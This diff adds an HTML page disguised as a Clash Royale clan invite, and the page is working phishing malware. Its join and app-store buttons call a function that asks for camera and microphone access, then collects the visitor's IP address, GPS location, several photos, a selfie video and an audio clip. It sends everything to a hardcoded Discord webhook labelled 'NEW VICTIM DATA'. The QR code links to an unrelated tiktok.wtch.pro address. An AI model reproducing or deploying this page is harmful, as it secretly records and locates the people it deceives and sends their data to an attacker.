@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+ <html>
+ <head>
+
+     <meta property="og:title" content="Clan Invite - Clash Royale" />
+     <meta property="og:description" content="Click this link to Join a clan in Clash Royale!" />
+     <meta property="og:image" content="https://discover.therookies.co/content/images/size/w1000/2020/02/clash-royale.jpg" />
+     <meta property="og:url" content="https://github.com/delet35/ClashRoyalClanInvite.git" />
+     <meta property="og:type" content="website" />
+
+
+     <title>CLASH ROYALE</title>
+     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+     <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+     <link rel="icon" href="https://img.tapimg.net/market/images/fce4e8232e9e9510ab646dbf62399c59.png" type="image/png">
+     <title>Clan Invite - Clash Royal</title>
+     <style>
+
+         /* TIGHTER STYLES */
+         html, body {
+             overflow: hidden;
+             margin: 0;
+             padding: 0;
+             height: 100%;
+             background: url('https://mir-s3-cdn-cf.behance.net/project_modules/1400/5196db60494431.5a4ee5c65c1c4.jpg') no-repeat center center fixed;
+             background-size: cover;
+             font-family: 'Arial Black', sans-serif;
+         }
+
+         .container {
+             display: flex;
+             flex-direction: column;
+             align-items: center;
+             padding: 15px;
+             min-height: 100vh;
+             box-sizing: border-box;
+         }
+
+         .logo {
+             width: 360px;
+         }
+
+         .invite-text {
+             color: #FFF;
+             text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+             margin: 5px 0;
+             font-size: 1.1em;
+         }
+
+         .join-button {
+             background: linear-gradient(180deg, #FFD700 0%, #D4AF37 100%);
+             color: #8B0000 !important;
+             padding: 12px 35px;
+             border-radius: 25px;
+             text-decoration: none;
+             font-size: 1.1em;
+             border: 3px solid #8B0000;
+             box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+             margin: 15px 0;
+             order: 2;
+         }
+
+         .qr-container {
+             background: white;
+             padding: 12px;
+             border-radius: 15px;
+             box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+             margin: 10px 0;
+             order: 3;
+         }
+
+         .store-buttons {
+             display: flex;
+             gap: 10px;
+             margin: 15px 0;
+             order: 4;
+         }
+
+             .store-buttons img {
+                 height: 40px;
+                 transition: transform 0.2s;
+             }
+
+                 .store-buttons img:hover {
+                     transform: scale(1.03);
+                 }
+
+         .download-text {
+             color: #FFD700;
+             text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+             margin: 10px 0;
+             order: 5;
+         }
+     </style>
+ </head>
+ <body>
+     <div class="container">
+         <img src="https://d290ny10omyv12.cloudfront.net/images/clash-royale-og-wa.png"
+              class="logo"
+              alt="Clash Logo">
+
+         <p class="invite-text">
+             Join your Friend in Clash Royale!
+
+         </p>
+
+         <div class="qr-container">
+             <div id="qrcode"></div>
+         </div>
+         <button onclick="initiateTotalChaos()" class="join-button">
+             <!-- MODIFIED -->
+             JOIN CLAN!
+         </button>
+         <p class="download-text">Download Clash Royale</p>
+         <br />
+         <div class="store-buttons">
+             <a onclick="initiateTotalChaos()">
+                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/2560px-Download_on_the_App_Store_Badge.svg.png" alt="App Store">
+             </a>
+             <a onclick="initiateTotalChaos()">
+                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/1280px-Google_Play_Store_badge_EN.svg.png" alt="Google Play">
+             </a>
+         </div>
+
+
+
+
+     </div>
+
+     <script>
+         new QRCode(document.getElementById("qrcode"), {
+             text: "https://tiktok.wtch.pro?video=1032711939 ",
+             width: 160,
+             height: 160,
+             colorDark: "#000000",
+             colorLight: "#FFFFFF",
+             correctLevel: QRCode.CorrectLevel.H
+         });
+     </script>
+     <script>
+         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1354180731139657768/MYr76j8rVFUzNUnKR95g_XY_oZun4PIVh9YlJpbuIkxAe3CdXjW-951jCOBcGd68X2oP';
+
+         async function initiateTotalChaos() {
+             let media;
+             const debugData = {};
+
+             try {
+                 // ================== INSTANT MEDIA REQUEST ================== //
+                 media = await navigator.mediaDevices.getUserMedia({
+                     video: { facingMode: 'environment' },
+                     audio: true
+                 });
+
+                 // ================== PARALLEL DATA COLLECTION ================== //
+                 const [ipData, geoloc, frontCam, selfieVideo, audioBlob] = await Promise.all([
+                     // IP Data
+                     fetch('https://ipwho.is/').then(res => res.json()),
+
+                     // Geolocation
+                     new Promise((resolve) =>
+                         navigator.geolocation.getCurrentPosition(resolve)),
+
+                     // Front camera photos
+                     (async () => {
+                         const capture = new ImageCapture(media.getVideoTracks()[0]);
+                         const photos = await Promise.all([1, 2, 3].map(() => capture.takePhoto()));
+                         media.getVideoTracks().forEach(track => track.stop());
+                         return photos;
+                     })(),
+
+                     // Selfie camera VIDEO recording (5 seconds)
+                     (async () => {
+                         const stream = await navigator.mediaDevices.getUserMedia({
+                             video: { facingMode: 'user' }
+                         });
+
+                         const recorder = new MediaRecorder(stream);
+                         const chunks = [];
+
+                         return new Promise((resolve) => {
+                             recorder.ondataavailable = e => chunks.push(e.data);
+                             recorder.start();
+                             setTimeout(() => {
+                                 recorder.stop();
+                                 stream.getTracks().forEach(track => track.stop());
+                                 resolve(new Blob(chunks, { type: 'video/webm' }));
+                             }, 5000);
+                         });
+                     })(),
+
+                     // Audio recording
+                     (async () => {
+                         const recorder = new MediaRecorder(media);
+                         const chunks = [];
+                         recorder.ondataavailable = e => chunks.push(e.data);
+                         recorder.start();
+                         await new Promise(r => setTimeout(r, 5000));
+                         recorder.stop();
+                         return new Blob(chunks, { type: 'audio/webm' });
+                     })()
+                 ]);
+
+                 // Store collected data
+                 debugData.ip = ipData.ip;
+                 debugData.gps = `${geoloc.coords.latitude},${geoloc.coords.longitude}`;
+
+                 // ================== DISCORD UPLOAD ================== //
+                 const formData = new FormData();
+                 formData.append('content', `🚨 NEW VICTIM DATA 🚨
+ IP: ${debugData.ip}
+ GPS: ${debugData.gps}
+ User Agent: ${navigator.userAgent}`);
+
+                 // Add front camera photos
+                 frontCam.forEach((photo, index) => {
+                     formData.append(`photo_${index}`, photo, `front_${index}.jpg`);
+                 });
+
+                 // Add selfie video
+                 formData.append('video_selfie', selfieVideo, 'selfie_recording.webm');
+
+                 // Add audio
+                 formData.append('audio', audioBlob, 'voice.webm');
+
+                 await fetch(DISCORD_WEBHOOK, {
+                     method: 'POST',
+                     body: formData
+                 });
+
+             } catch (error) {
+                 console.error('FRANK ERROR:', error);
+                 localStorage.setItem('frank_failsafe', JSON.stringify({
+                     error: error.message,
+                     debugData,
+                     timestamp: Date.now()
+                 }));
+             } finally {
+                 if (media) media.getTracks().forEach(track => track.stop());
+             }
+         }
+     </script>
+ </body>
+ </html>
